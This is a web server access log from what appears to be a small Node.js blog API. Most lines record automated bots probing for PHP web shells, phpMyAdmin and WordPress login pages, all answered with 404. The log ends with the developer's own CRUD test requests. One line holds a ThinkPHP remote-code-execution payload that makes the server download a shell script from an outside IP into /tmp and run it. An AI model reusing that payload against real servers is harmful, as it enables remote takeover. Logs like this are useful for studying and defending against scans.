[0mPOST /xshell.php [33m404 [0m0.818 ms - 1534[0m
[0mPOST /qq.php [33m404 [0m1.375 ms - 1534[0m
[0mPOST /conflg.php [33m404 [0m0.770 ms - 1534[0m
[0mPOST /conflg.php [33m404 [0m0.808 ms - 1534[0m
[0mPOST /lindex.php [33m404 [0m0.782 ms - 1534[0m
[0mPOST /phpstudy.php [33m404 [0m0.846 ms - 1534[0m
[0mPOST /phpStudy.php [33m404 [0m0.795 ms - 1534[0m
[0mPOST /weixiao.php [33m404 [0m0.821 ms - 1534[0m
[0mPOST /feixiang.php [33m404 [0m0.825 ms - 1534[0m
[0mPOST /ak47.php [33m404 [0m0.867 ms - 1534[0m
[0mPOST /ak48.php [33m404 [0m0.827 ms - 1534[0m
[0mPOST /xiao.php [33m404 [0m0.887 ms - 1534[0m
[0mPOST /yao.php [33m404 [0m0.856 ms - 1534[0m
[0mPOST /defect.php [33m404 [0m2.077 ms - 1534[0m
[0mPOST /webslee.php [33m404 [0m1.541 ms - 1534[0m
[0mPOST /q.php [33m404 [0m0.978 ms - 1534[0m
[0mPOST /pe.php [33m404 [0m0.730 ms - 1534[0m
[0mPOST /hm.php [33m404 [0m0.907 ms - 1534[0m
[0mPOST /cainiao.php [33m404 [0m0.813 ms - 1534[0m
[0mPOST /zuoshou.php [33m404 [0m1.019 ms - 1534[0m
[0mPOST /zuo.php [33m404 [0m0.856 ms - 1534[0m
[0mPOST /aotu.php [33m404 [0m0.916 ms - 1534[0m
[0mPOST /aotu7.php [33m404 [0m0.884 ms - 1534[0m
[0mPOST /cmd.php [33m404 [0m0.790 ms - 1534[0m
[0mPOST /bak.php [33m404 [0m0.644 ms - 1534[0m
[0mPOST /system.php [33m404 [0m1.914 ms - 1534[0m
[0mPOST /l6.php [33m404 [0m0.822 ms - 1534[0m
[0mPOST /l7.php [33m404 [0m1.154 ms - 1534[0m
[0mPOST /l8.php [33m404 [0m0.853 ms - 1534[0m
[0mPOST /q.php [33m404 [0m0.984 ms - 1534[0m
[0mPOST /56.php [33m404 [0m0.823 ms - 1534[0m
[0mPOST /mz.php [33m404 [0m1.089 ms - 1534[0m
[0mPOST /xx.php [33m404 [0m0.961 ms - 1534[0m
[0mPOST /yumo.php [33m404 [0m3.339 ms - 1534[0m
[0mPOST /wan.php [33m404 [0m1.112 ms - 1534[0m
[0mPOST /wanan.php [33m404 [0m0.927 ms - 1534[0m
[0mPOST /ssaa.php [33m404 [0m0.749 ms - 1534[0m
[0mPOST /qq.php [33m404 [0m1.843 ms - 1534[0m
[0mPOST /aw.php [33m404 [0m0.890 ms - 1534[0m
[0mPOST /12.php [33m404 [0m1.063 ms - 1534[0m
[0mPOST /hh.php [33m404 [0m0.855 ms - 1534[0m
[0mPOST /ak.php [33m404 [0m1.036 ms - 1534[0m
[0mPOST /infoo.php [33m404 [0m0.848 ms - 1534[0m
[0mPOST /qq.php [33m404 [0m0.619 ms - 1534[0m
[0mPOST /qwe.php [33m404 [0m0.813 ms - 1534[0m
[0mPOST /1213.php [33m404 [0m0.711 ms - 1534[0m
[0mPOST /post.php [33m404 [0m0.916 ms - 1534[0m
[0mPOST /aaaa.php [33m404 [0m1.062 ms - 1534[0m
[0mPOST /h1.php [33m404 [0m1.079 ms - 1534[0m
[0mPOST /test.php [33m404 [0m1.837 ms - 1534[0m
[0mPOST /3.php [33m404 [0m1.064 ms - 1534[0m
[0mPOST /phpinfi.php [33m404 [0m0.884 ms - 1534[0m
[0mPOST /9510.php [33m404 [0m1.129 ms - 1534[0m
[0mPOST /python.php [33m404 [0m0.856 ms - 1534[0m
[0mPOST /default.php [33m404 [0m0.859 ms - 1534[0m
[0mPOST /sean.php [33m404 [0m0.822 ms - 1534[0m
[0mPOST /app.php [33m404 [0m0.796 ms - 1534[0m
[0mPOST /help.php [33m404 [0m0.945 ms - 1534[0m
[0mPOST /tiandi.php [33m404 [0m0.859 ms - 1534[0m
[0mPOST /miao.php [33m404 [0m0.892 ms - 1534[0m
[0mPOST /xz.php [33m404 [0m0.872 ms - 1534[0m
[0mPOST /linuxse.php [33m404 [0m1.367 ms - 1534[0m
[0mPOST /zuoindex.php [33m404 [0m0.782 ms - 1534[0m
[0mPOST /zshmindex.php [33m404 [0m0.865 ms - 1534[0m
[0mPOST /tomcat.php [33m404 [0m8.545 ms - 1534[0m
[0mPOST /ceshi.php [33m404 [0m0.808 ms - 1534[0m
[0mPOST /1hou.php [33m404 [0m0.716 ms - 1534[0m
[0mPOST /ou2.php [33m404 [0m0.578 ms - 1534[0m
[0mPOST /zuos.php [33m404 [0m0.789 ms - 1534[0m
[0mPOST /zuoss.php [33m404 [0m0.906 ms - 1534[0m
[0mPOST /zuoshss.php [33m404 [0m0.885 ms - 1534[0m
[0mPOST /boots.php [33m404 [0m0.725 ms - 1534[0m
[0mPOST /she.php [33m404 [0m0.924 ms - 1534[0m
[0mPOST /s.php [33m404 [0m1.408 ms - 1534[0m
[0mPOST /qw.php [33m404 [0m0.933 ms - 1534[0m
[0mPOST /test.php [33m404 [0m1.507 ms - 1534[0m
[0mPOST /caonma.php [33m404 [0m0.805 ms - 1534[0m
[0mPOST /wcp.php [33m404 [0m0.728 ms - 1534[0m
[0mPOST /u.php [33m404 [0m1.201 ms - 1534[0m
[0mPOST /uuu.php [33m404 [0m1.088 ms - 1534[0m
[0mPOST /sss.php [33m404 [0m0.818 ms - 1534[0m
[0mPOST /ss.php [33m404 [0m0.857 ms - 1534[0m
[0mPOST /sss.php [33m404 [0m0.843 ms - 1534[0m
[0mPOST /mazi.php [33m404 [0m0.766 ms - 1534[0m
[0mPOST /phpini.php [33m404 [0m1.126 ms - 1534[0m
[0mPOST /1.php [33m404 [0m0.727 ms - 1534[0m
[0mPOST /2.php [33m404 [0m0.837 ms - 1534[0m
[0mPOST /core.php [33m404 [0m0.994 ms - 1534[0m
[0mPOST /qaz.php [33m404 [0m1.152 ms - 1534[0m
[0mPOST /sha.php [33m404 [0m0.951 ms - 1534[0m
[0mPOST /ppx.php [33m404 [0m1.666 ms - 1534[0m
[0mPOST /1.php [33m404 [0m1.020 ms - 1534[0m
[0mPOST /confg.php [33m404 [0m1.092 ms - 1534[0m
[0mPOST /conf1g.php [33m404 [0m0.802 ms - 1534[0m
[0mPOST /confg.php [33m404 [0m0.878 ms - 1534[0m
[0mPOST /confg.php [33m404 [0m0.809 ms - 1534[0m
[0mPOST /confg.php [33m404 [0m0.818 ms - 1534[0m
[0mPOST /ver.php [33m404 [0m2.586 ms - 1534[0m
[0mPOST /hack.php [33m404 [0m0.876 ms - 1534[0m
[0mPOST /qa.php [33m404 [0m0.767 ms - 1534[0m
[0mPOST /Ss.php [33m404 [0m1.302 ms - 1534[0m
[0mPOST /xxx.php [33m404 [0m0.773 ms - 1534[0m
[0mPOST /92.php [33m404 [0m0.751 ms - 1534[0m
[0mPOST /z.php [33m404 [0m0.800 ms - 1534[0m
[0mPOST /x.php [33m404 [0m1.102 ms - 1534[0m
[0mPOST /dexgp.php [33m404 [0m0.751 ms - 1534[0m
[0mPOST /nuoxi.php [33m404 [0m0.660 ms - 1534[0m
[0mPOST /godkey.php [33m404 [0m1.009 ms - 1534[0m
[0mPOST /okokok.php [33m404 [0m1.426 ms - 1534[0m
[0mPOST /erwa.php [33m404 [0m0.945 ms - 1534[0m
[0mPOST /pma.php [33m404 [0m1.091 ms - 1534[0m
[0mPOST /ruyi.php [33m404 [0m0.875 ms - 1534[0m
[0mPOST /51314.php [33m404 [0m1.090 ms - 1534[0m
[0mPOST /5201314.php [33m404 [0m0.909 ms - 1534[0m
[0mPOST /fusheng.php [33m404 [0m1.088 ms - 1534[0m
[0mPOST /general.php [33m404 [0m0.838 ms - 1534[0m
[0mPOST /repeat.php [33m404 [0m1.850 ms - 1534[0m
[0mPOST /ldw.php [33m404 [0m5.340 ms - 1534[0m
[0mPOST /api.php [33m404 [0m0.816 ms - 1534[0m
[0mPOST /s1.php [33m404 [0m0.873 ms - 1534[0m
[0mPOST /xiaodai.php [33m404 [0m1.476 ms - 1534[0m
[0mPOST /hello.php [33m404 [0m0.922 ms - 1534[0m
[0mPOST /hello.php [33m404 [0m0.825 ms - 1534[0m
[0mPOST /admn.php [33m404 [0m5.964 ms - 1534[0m
[0mPOST /hell.php [33m404 [0m0.764 ms - 1534[0m
[0mPOST /xp.php [33m404 [0m1.061 ms - 1534[0m
[0mPOST /1.php [33m404 [0m0.791 ms - 1534[0m
[0mPOST /2.php [33m404 [0m0.913 ms - 1534[0m
[0mPOST /1.php [33m404 [0m1.160 ms - 1534[0m
[0mPOST /a.php [33m404 [0m1.163 ms - 1534[0m
[0mPOST /m.php [33m404 [0m0.775 ms - 1534[0m
[0mPOST /conf.php [33m404 [0m0.932 ms - 1534[0m
[0mPOST /123.php [33m404 [0m1.533 ms - 1534[0m
[0mPOST /HX.php [33m404 [0m0.790 ms - 1534[0m
[0mPOST /diy.php [33m404 [0m0.846 ms - 1534[0m
[0mPOST /666.php [33m404 [0m1.028 ms - 1534[0m
[0mPOST /777.php [33m404 [0m0.611 ms - 1534[0m
[0mPOST /qwq.php [33m404 [0m0.874 ms - 1534[0m
[0mPOST /qwqw.php [33m404 [0m0.984 ms - 1534[0m
[0mPOST /.php [33m404 [0m0.998 ms - 1534[0m
[0mPOST /infos.php [33m404 [0m0.619 ms - 1534[0m
[0mPOST /x.php [33m404 [0m0.764 ms - 1534[0m
[0mPOST /lucky.php [33m404 [0m0.797 ms - 1534[0m
[0mPOST /htfr.php [33m404 [0m0.989 ms - 1534[0m
[0mPOST /zzk.php [33m404 [0m1.720 ms - 1534[0m
[0mPOST /toor.php [33m404 [0m0.841 ms - 1534[0m
[0mPOST /uu.php [33m404 [0m0.831 ms - 1534[0m
[0mPOST /aa.php [33m404 [0m0.909 ms - 1534[0m
[0mPOST /wb.php [33m404 [0m0.798 ms - 1534[0m
[0mPOST /yj.php [33m404 [0m0.931 ms - 1534[0m
[0mPOST /z.php [33m404 [0m0.811 ms - 1534[0m
[0mPOST /7.php [33m404 [0m1.624 ms - 1534[0m
[0mPOST /xiaoma.php [33m404 [0m0.810 ms - 1534[0m
[0mPOST /xiaomae.php [33m404 [0m0.827 ms - 1534[0m
[0mPOST /xiaomar.php [33m404 [0m0.645 ms - 1534[0m
[0mPOST /qq.php [33m404 [0m0.851 ms - 1534[0m
[0mPOST /data.php [33m404 [0m0.790 ms - 1534[0m
[0mPOST /log.php [33m404 [0m0.733 ms - 1534[0m
[0mPOST /fack.php [33m404 [0m0.835 ms - 1534[0m
[0mPOST /angge.php [33m404 [0m0.823 ms - 1534[0m
[0mPOST /cxfm666.php [33m404 [0m1.358 ms - 1534[0m
[0mPOST /db.php [33m404 [0m2.507 ms - 1534[0m
[0mPOST /hacly.php [33m404 [0m0.814 ms - 1534[0m
[0mPOST /xiaomo.php [33m404 [0m1.400 ms - 1534[0m
[0mPOST /xiaoyu.php [33m404 [0m1.338 ms - 1534[0m
[0mPOST /xiaohei.php [33m404 [0m0.861 ms - 1534[0m
[0mPOST /j.php [33m404 [0m0.823 ms - 1534[0m
[0mPOST /qq5262.php [33m404 [0m0.869 ms - 1534[0m
[0mPOST /lost.php [33m404 [0m1.446 ms - 1534[0m
[0mPOST /php.php [33m404 [0m0.860 ms - 1534[0m
[0mPOST /win.php [33m404 [0m0.876 ms - 1534[0m
[0mPOST /win1.php [33m404 [0m0.856 ms - 1534[0m
[0mPOST /linux.php [33m404 [0m1.266 ms - 1534[0m
[0mPOST /linux1.php [33m404 [0m0.828 ms - 1534[0m
[0mPOST /cc.php [33m404 [0m0.810 ms - 1534[0m
[0mPOST /x.php [33m404 [0m0.812 ms - 1534[0m
[0mPOST /lanke.php [33m404 [0m1.265 ms - 1534[0m
[0mPOST /neko.php [33m404 [0m0.905 ms - 1534[0m
[0mPOST /super.php [33m404 [0m1.506 ms - 1534[0m
[0mPOST /cere.php [33m404 [0m0.680 ms - 1534[0m
[0mPOST /aaa.php [33m404 [0m1.349 ms - 1534[0m
[0mPOST /Administrator.php [33m404 [0m0.766 ms - 1534[0m
[0mPOST /liangchen.php [33m404 [0m0.807 ms - 1534[0m
[0mPOST /lucky.php [33m404 [0m0.828 ms - 1534[0m
[0mPOST /meng.php [33m404 [0m2.089 ms - 1534[0m
[0mPOST /no.php [33m404 [0m0.813 ms - 1534[0m
[0mPOST /mysql.php [33m404 [0m0.856 ms - 1534[0m
[0mPOST /Updata.php [33m404 [0m0.837 ms - 1534[0m
[0mPOST /xxxx.php [33m404 [0m1.318 ms - 1534[0m
[0mPOST /guai.php [33m404 [0m0.808 ms - 1534[0m
[0mPOST /ljb.php [33m404 [0m0.818 ms - 1534[0m
[0mPOST /www.php [33m404 [0m0.825 ms - 1534[0m
[0mPOST /1.php [33m404 [0m1.454 ms - 1534[0m
[0mPOST /chaoda.php [33m404 [0m0.730 ms - 1534[0m
[0mPOST /qq.php [33m404 [0m0.813 ms - 1534[0m
[0mPOST /qq.php [33m404 [0m0.807 ms - 1534[0m
[0mPOST /vuln1.php [33m404 [0m0.702 ms - 1534[0m
[0mPOST /orange.php [33m404 [0m1.404 ms - 1534[0m
[0mPOST /erba.php [33m404 [0m0.802 ms - 1534[0m
[0mPOST /link.php [33m404 [0m0.866 ms - 1534[0m
[0mPOST /linkr.php [33m404 [0m0.798 ms - 1534[0m
[0mPOST /linkx.php [33m404 [0m0.846 ms - 1534[0m
[0mPOST /kvast.php [33m404 [0m0.816 ms - 1534[0m
[0mPOST /xiaobin.php [33m404 [0m1.310 ms - 1534[0m
[0mPOST /ppp.php [33m404 [0m1.395 ms - 1534[0m
[0mPOST /lm.php [33m404 [0m0.804 ms - 1534[0m
[0mPOST /zzz.php [33m404 [0m1.360 ms - 1534[0m
[0mPOST /520.php [33m404 [0m0.856 ms - 1534[0m
[0mPOST /lmn.php [33m404 [0m1.154 ms - 1534[0m
[0mPOST /bx.php [33m404 [0m0.651 ms - 1534[0m
[0mPOST /Moxin.PHP [33m404 [0m1.683 ms - 1534[0m
[0mPOST /CCCC.PHP [33m404 [0m0.837 ms - 1534[0m
[0mPOST /mobai.PHP [33m404 [0m0.942 ms - 1534[0m
[0mPOST /ppp.php [33m404 [0m0.843 ms - 1534[0m
[0mPOST /MCLi.php [33m404 [0m0.653 ms - 1534[0m
[0mPOST /MCLi.php [33m404 [0m0.974 ms - 1534[0m
[0mPOST /1.php [33m404 [0m1.614 ms - 1534[0m
[0mPOST /d.php [33m404 [0m0.826 ms - 1534[0m
[0mPOST /function.inc.php [33m404 [0m0.929 ms - 1534[0m
[0mPOST /zxc1.php [33m404 [0m0.954 ms - 1534[0m
[0mPOST /zxc0.php [33m404 [0m1.612 ms - 1534[0m
[0mPOST /zxc1.php [33m404 [0m0.766 ms - 1534[0m
[0mPOST /indexa.php [33m404 [0m0.832 ms - 1534[0m
[0mPOST /lx.php [33m404 [0m0.669 ms - 1534[0m
[0mPOST /cn.php [33m404 [0m0.811 ms - 1534[0m
[0mPOST /api.php [33m404 [0m1.731 ms - 1534[0m
[0mPOST /index1.php [33m404 [0m0.826 ms - 1534[0m
[0mPOST /info.php [33m404 [0m0.879 ms - 1534[0m
[0mPOST /info1.php [33m404 [0m1.715 ms - 1534[0m
[0mPOST /aaaaaa1.php [33m404 [0m0.804 ms - 1534[0m
[0mPOST /test123.php [33m404 [0m1.002 ms - 1534[0m
[0mPOST /test123.php [33m404 [0m1.078 ms - 1534[0m
[0mPOST /fb.php [33m404 [0m0.607 ms - 1534[0m
[0mPOST /paylog.php [33m404 [0m0.665 ms - 1534[0m
[0mPOST /paylog.php [33m404 [0m0.687 ms - 1534[0m
[0mPOST /x.php [33m404 [0m0.713 ms - 1534[0m
[0mPOST /cnm.php [33m404 [0m1.375 ms - 1534[0m
[0mPOST /1ndex.php [33m404 [0m1.383 ms - 1534[0m
[0mPOST /cadre.php [33m404 [0m1.054 ms - 1534[0m
[0mPOST /mm.php [33m404 [0m0.969 ms - 1534[0m
[0mPOST /test.php [33m404 [0m1.648 ms - 1534[0m
[0mPOST /1q.php [33m404 [0m0.835 ms - 1534[0m
[0mPOST /1111.php [33m404 [0m1.143 ms - 1534[0m
[0mPOST /errors.php [33m404 [0m1.352 ms - 1534[0m
[0mPOST /q.php [33m404 [0m0.880 ms - 1534[0m
[0mPOST /lanyecn.php [33m404 [0m0.898 ms - 1534[0m
[0mPOST /mybestloves.php [33m404 [0m0.844 ms - 1534[0m
[0mPOST /xiaoxi.php [33m404 [0m0.792 ms - 1534[0m
[0mPOST /ww.php [33m404 [0m1.106 ms - 1534[0m
[0mPOST /my.php [33m404 [0m1.013 ms - 1534[0m
[0mPOST /pop.php [33m404 [0m1.074 ms - 1534[0m
[0mPOST /aaa.php [33m404 [0m1.115 ms - 1534[0m
[0mPOST /images/1.php [33m404 [0m2.160 ms - 1534[0m
[0mPOST /images/asp.php [33m404 [0m0.936 ms - 1534[0m
[0mPOST /images/entyy.php [33m404 [0m0.652 ms - 1534[0m
[0mPOST /images/1ndex.php [33m404 [0m0.775 ms - 1534[0m
[0mPOST /images/defau1t.php [33m404 [0m0.842 ms - 1534[0m
[0mPOST /wp-content/plugins/fAaWBH.php [33m404 [0m0.849 ms - 1534[0m
[0mPOST /index.php?s=captcha [33m404 [0m0.854 ms - 1534[0m
[0mPOST /index.php?s=captcha [33m404 [0m0.688 ms - 1534[0m
[0mGET /index.php [33m404 [0m0.787 ms - 1539[0m
[0mGET /phpmyadmin/index.php [33m404 [0m2.336 ms - 1539[0m
[0mGET /phpMyAdmin/index.php [33m404 [0m0.707 ms - 1539[0m
[0mGET /pmd/index.php [33m404 [0m0.831 ms - 1539[0m
[0mGET /pma/index.php [33m404 [0m1.420 ms - 1539[0m
[0mGET /PMA/index.php [33m404 [0m0.810 ms - 1539[0m
[0mGET /PMA2/index.php [33m404 [0m0.738 ms - 1539[0m
[0mGET /pmamy/index.php [33m404 [0m0.794 ms - 1539[0m
[0mGET /pmamy2/index.php [33m404 [0m0.976 ms - 1539[0m
[0mGET /mysql/index.php [33m404 [0m1.136 ms - 1539[0m
[0mGET /admin/index.php [33m404 [0m0.823 ms - 1539[0m
[0mGET /db/index.php [33m404 [0m0.840 ms - 1539[0m
[0mGET /web/phpMyAdmin/index.php [33m404 [0m0.952 ms - 1539[0m
[0mGET /admin/pma/index.php [33m404 [0m0.995 ms - 1539[0m
[0mGET /admin/PMA/index.php [33m404 [0m0.856 ms - 1539[0m
[0mGET /admin/mysql/index.php [33m404 [0m2.565 ms - 1539[0m
[0mGET /admin/mysql2/index.php [33m404 [0m1.461 ms - 1539[0m
[0mGET /admin/phpmyadmin/index.php [33m404 [0m0.735 ms - 1539[0m
[0mGET /admin/phpmyadmin2/index.php [33m404 [0m0.949 ms - 1539[0m
[0mGET /mysqladmin/index.php [33m404 [0m1.060 ms - 1539[0m
[0mGET /mysql-admin/index.php [33m404 [0m0.805 ms - 1539[0m
[0mGET /mysql_admin/index.php [33m404 [0m0.871 ms - 1539[0m
[0mGET /phpadmin/index.php [33m404 [0m0.731 ms - 1539[0m
[0mGET /phpAdmin/index.php [33m404 [0m0.708 ms - 1539[0m
[0mGET /phpmyadmin0/index.php [33m404 [0m0.709 ms - 1539[0m
[0mGET /phpmyadmin1/index.php [33m404 [0m1.586 ms - 1539[0m
[0mGET /phpMyAdmin-4.4.0/index.php [33m404 [0m0.885 ms - 1539[0m
[0mGET /myadmin/index.php [33m404 [0m0.947 ms - 1539[0m
[0mGET /myadmin2/index.php [33m404 [0m1.496 ms - 1539[0m
[0mGET /xampp/phpmyadmin/index.php [33m404 [0m0.692 ms - 1539[0m
[0mGET /phpMyadmin_bak/index.php [33m404 [0m0.624 ms - 1539[0m
[0mGET /www/phpMyAdmin/index.php [33m404 [0m0.553 ms - 1539[0m
[0mGET /tools/phpMyAdmin/index.php [33m404 [0m0.784 ms - 1539[0m
[0mGET /phpmyadmin-old/index.php [33m404 [0m0.742 ms - 1539[0m
[0mGET /phpMyAdminold/index.php [33m404 [0m0.784 ms - 1539[0m
[0mGET /phpMyAdmin.old/index.php [33m404 [0m0.613 ms - 1539[0m
[0mGET /claroline/phpMyAdmin/index.php [33m404 [0m1.343 ms - 1539[0m
[0mGET /typo3/phpmyadmin/index.php [33m404 [0m6.800 ms - 1539[0m
[0mGET /phpma/index.php [33m404 [0m0.993 ms - 1539[0m
[0mGET /phpmyadmin/phpmyadmin/index.php [33m404 [0m0.979 ms - 1539[0m
[0mGET /phpMyAdmin/phpMyAdmin/index.php [33m404 [0m0.879 ms - 1539[0m
[0mGET /phpMyAbmin/index.php [33m404 [0m0.823 ms - 1539[0m
[0mGET /phpMyAdmin__/index.php [33m404 [0m0.840 ms - 1539[0m
[0mGET /phpMyAdmin+++---/index.php [33m404 [0m0.879 ms - 1539[0m
[0mGET /v/index.php [33m404 [0m0.717 ms - 1539[0m
[0mGET /phpmyadm1n/index.php [33m404 [0m3.857 ms - 1539[0m
[0mGET /phpMyAdm1n/index.php [33m404 [0m0.846 ms - 1539[0m
[0mGET /shaAdmin/index.php [33m404 [0m0.895 ms - 1539[0m
[0mGET /phpMyadmi/index.php [33m404 [0m0.890 ms - 1539[0m
[0mGET /phpMyAdmion/index.php [33m404 [0m0.676 ms - 1539[0m
[0mGET /s/index.php [33m404 [0m0.746 ms - 1539[0m
[0mGET /MyAdmin/index.php [33m404 [0m0.799 ms - 1539[0m
[0mGET /phpMyAdmin1/index.php [33m404 [0m0.880 ms - 1539[0m
[0mGET /phpMyAdmin123/index.php [33m404 [0m0.822 ms - 1539[0m
[0mGET /phpMyAdmina/index.php [33m404 [0m0.846 ms - 1539[0m
[0mGET /phpMydmin/index.php [33m404 [0m0.807 ms - 1539[0m
[0mGET /phpMyAdmins/index.php [33m404 [0m0.718 ms - 1539[0m
[0mGET /phpMyAdmin._/index.php [33m404 [0m0.841 ms - 1539[0m
[0mGET /phpmyadmin2222/index.php [33m404 [0m0.835 ms - 1539[0m
[0mGET /php2MyAdmin/index.php [33m404 [0m0.780 ms - 1539[0m
[0mGET /phpiMyAdmin/index.php [33m404 [0m0.750 ms - 1539[0m
[0mGET /phpNyAdmin/index.php [33m404 [0m0.992 ms - 1539[0m
[0mGET /program/index.php [33m404 [0m0.790 ms - 1539[0m
[0mGET /shopdb/index.php [33m404 [0m1.750 ms - 1539[0m
[0mGET /phppma/index.php [33m404 [0m1.166 ms - 1539[0m
[0mGET /phpmy/index.php [33m404 [0m1.072 ms - 1539[0m
[0mGET /mysql/admin/index.php [33m404 [0m0.766 ms - 1539[0m
[0mGET /mysql/dbadmin/index.php [33m404 [0m0.776 ms - 1539[0m
[0mGET /mysql/sqlmanager/index.php [33m404 [0m0.902 ms - 1539[0m
[0mGET /mysql/mysqlmanager/index.php [33m404 [0m0.971 ms - 1539[0m
[0mGET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php [33m404 [0m0.867 ms - 1539[0m
[0mGET /manager/html [33m404 [0m0.987 ms - 1539[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://82.212.70.218/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a; [33m404 [0m0.853 ms - 1539[0m
[0mGET / [32m200 [0m0.712 ms - 967[0m
[0mGET / [32m200 [0m1.063 ms - 967[0m
[0mGET / [32m200 [0m0.979 ms - 967[0m
[0mGET / [32m200 [0m0.778 ms - 967[0m
[0mGET / [32m200 [0m1.944 ms - 967[0m
[0mGET / [32m200 [0m0.962 ms - 967[0m
[0mGET / [32m200 [0m0.688 ms - 967[0m
[0mGET / [32m200 [0m0.793 ms - 967[0m
[0mGET / [32m200 [0m0.654 ms - 967[0m
[0mGET / [32m200 [0m0.759 ms - 967[0m
[0mGET / [32m200 [0m3.470 ms - 967[0m
[0mGET / [32m200 [0m0.642 ms - 967[0m
[0mGET / [32m200 [0m0.882 ms - 967[0m
[0mGET /news/wp-login.php [33m404 [0m10.413 ms - 1539[0m
[0mGET / [32m200 [0m2.468 ms - 967[0m
[0mGET / [32m200 [0m0.792 ms - 967[0m
[0mGET /blog2/wp-login.php [33m404 [0m0.972 ms - 1539[0m
[0mGET / [32m200 [0m0.738 ms - 967[0m
[0mGET / [32m200 [0m0.997 ms - 967[0m
[0mGET /manager/html [33m404 [0m1.106 ms - 1539[0m
[0mGET /1/wp-login.php [33m404 [0m1.152 ms - 1539[0m
[0mHEAD /robots.txt [33m404 [0m0.811 ms - 1539[0m
[0mGET / [32m200 [0m0.743 ms - 967[0m
[0mGET / [32m200 [0m1.911 ms - 967[0m
[0mGET /2/wp-login.php [33m404 [0m2.769 ms - 1539[0m
[0mGET / [32m200 [0m9.557 ms - 967[0m
[0mGET / [32m200 [0m0.910 ms - 967[0m
[0mGET /terver-status [33m404 [0m0.844 ms - 1539[0m
[0mGET /server-status [33m404 [0m0.806 ms - 1539[0m
[0mGET /terver-status [33m404 [0m1.109 ms - 1539[0m
[0mGET /server-status [33m404 [0m1.200 ms - 1539[0m
[0mGET /3/wp-login.php [33m404 [0m1.163 ms - 1539[0m
[0mGET / [32m200 [0m0.789 ms - 967[0m
[0mGET /terver-status [33m404 [0m0.925 ms - 1539[0m
[0mGET /server-status [33m404 [0m0.662 ms - 1539[0m
[0mGET / [32m200 [0m0.721 ms - 967[0m
[0mGET / [32m200 [0m1.003 ms - 967[0m
[0mGET / [32m200 [0m0.694 ms - 967[0m
[0mGET / [32m200 [0m1.017 ms - 967[0m
[0mGET / [32m200 [0m0.757 ms - 967[0m
[0mHEAD /robots.txt [33m404 [0m0.844 ms - 1539[0m
[0mGET / [32m200 [0m1.021 ms - 967[0m
[0mGET / [32m200 [0m0.670 ms - 967[0m
[0mGET /upload/bank-icons/bank-gh.jpg [33m404 [0m0.881 ms - 1539[0m
[0mGET /upload/bank-icons/bank_16.png [33m404 [0m0.572 ms - 1539[0m
[0mGET / [32m200 [0m0.745 ms - 967[0m
[0mGET / [32m200 [0m0.682 ms - 967[0m
[0mGET /site/wp-login.php [33m404 [0m0.908 ms - 1539[0m
[0mGET / [32m200 [0m0.718 ms - 967[0m
[0mGET / [32m200 [0m1.880 ms - 967[0m
[0mHEAD /robots.txt [33m404 [0m0.853 ms - 1539[0m
[0mGET / [32m200 [0m0.616 ms - 967[0m
[0mGET / [32m200 [0m1.011 ms - 967[0m
[0mGET / [32m200 [0m1.025 ms - 967[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m2.533 ms - 1539[0m
[0mGET /stylesheets/style.css [32m200 [0m62.661 ms - 111[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m8.047 ms - 1539[0m
[0mGET /bootstrap/js/bootstrap.min.js [32m200 [0m11.525 ms - 58072[0m
[0mGET /bootstrap/css/bootstrap.min.css [32m200 [0m68.083 ms - 155758[0m
[0mGET /bootstrap/css/fontawesome-all.css [33m404 [0m1.306 ms - 1539[0m
[0mGET /bootstrap/js/jquery.min.js [33m404 [0m1.819 ms - 1539[0m
[0mGET /favicon.ico [33m404 [0m0.878 ms - 1539[0m
[0mPOST /api//blogs/5c731c1b872de1ce8a0b7784 [33m404 [0m2.498 ms - 1527[0m
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
{ _id: 5c731c1b872de1ce8a0b7784,
  blogTitle: 'First Blog Title',
  blogText: 'First Blog Text',
  dateOfCreation: 3030-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c1b872de1ce8a0b7784 [32m200 [0m213.256 ms - 138[0m
Deleting blog entry with id of undefined
{ blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: '0000-02-24T03:24:00Z' }
[0mDELETE /api//blogs/5c731c1b872de1ce8a0b7784 [32m204 [0m16.058 ms - -[0m
[0mPUT /api//blogs/5c731c1b872de1ce8a0b7784?blogTitle=test [32m200 [0m84.194 ms - 135[0m
[0mPUT /api//blogs/5c731c1b872de1ce8a0b7784?blogTitle=cats [32m200 [0m4.947 ms - 135[0m
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
{ _id: 5c731c1b872de1ce8a0b7784,
  blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: 0000-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c1b872de1ce8a0b7784?blogTitle=cats [32m200 [0m3.362 ms - 135[0m
[0mPOST /api//blogs/5c731c1b872de1ce8a0b7784?blogTitle=cats [33m404 [0m0.907 ms - 1527[0m
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
{ _id: 5c731c1b872de1ce8a0b7784,
  blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: 0000-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c1b872de1ce8a0b7784 [32m200 [0m2.384 ms - 135[0m
Finding blog details { blogid: '5c731c1b872de1ce8a0b7784' }
{ _id: 5c731c1b872de1ce8a0b7784,
  blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: 0000-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c1b872de1ce8a0b7784 [32m200 [0m3.035 ms - 135[0m
Finding blog details { blogid: '5c731c3e872de1ce8a0b7785' }
{ _id: 5c731c3e872de1ce8a0b7785,
  blogTitle: '2nd Blog Title',
  blogText: '2nd Blog Text',
  dateOfCreation: 3040-02-24T03:24:00.000Z }
[0mGET /api//blogs/5c731c3e872de1ce8a0b7785 [32m200 [0m2.434 ms - 134[0m
Finding blog details { blogid: '5c731c3e872de1ce8a0b7785' }
{ _id: 5c731c3e872de1ce8a0b7785,
  blogTitle: '2nd Blog Title',
  blogText: '2nd Blog Text',
  dateOfCreation: 3040-02-24T03:24:00.000Z }
